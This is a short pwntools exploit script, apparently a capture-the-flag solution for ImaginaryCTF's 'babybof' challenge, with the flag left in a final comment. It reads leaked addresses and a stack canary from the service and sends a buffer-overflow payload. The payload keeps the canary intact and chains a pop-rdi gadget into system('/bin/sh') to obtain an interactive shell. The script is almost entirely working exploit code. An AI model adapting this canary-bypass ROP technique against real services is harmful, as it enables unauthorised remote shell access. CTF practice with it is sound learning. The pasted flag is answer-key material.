#!/usr/bin/env python3
from pwn import *

exe = ELF("./vuln")

context.binary = exe
context.log_level = 'debug'

gdbscript=""" """

def run():
    if args.LOCAL:
        p = process([exe.path])
        # gdb.attach(p, api=True, gdbscript=gdbscript)
    else:
        p = remote("babybof.chal.imaginaryctf.org", 1337)

    return p

p = run()
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sna = lambda msg, data: p.sendlineafter(msg, str(data).encode())
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sn = lambda data: p.sendline(str(data).encode())
s = lambda data: p.send(data)
ru = lambda msg: p.recvuntil(msg)

ru(b"system @ ")
system = p.recvline().strip().decode()
ru(b"ret @ ")
rdi = p.recvline().strip().decode()
ru(b"ret @ ")
ret = p.recvline().strip().decode()
ru(b" @ ")
binsh = p.recvline().strip().decode()
ru(b"canary: ")
canary = p.recvline().strip().decode()
info(f"system: {system}")
info(f"rdi: {rdi}")
info(f"ret: {ret}")
info(f"binsh: {binsh}")
info(f"canary: {canary}")

payload = b"A"* 56 + p64(int(canary, 16)) + b"B"*8 + p64(int(rdi, 16)) + p64(int(binsh, 16)) + p64(int(ret, 16)) + p64(int(system, 16))
sla(b": ", payload)
p.interactive()

#ictf{arent_challenges_written_two_hours_before_ctf_amazing}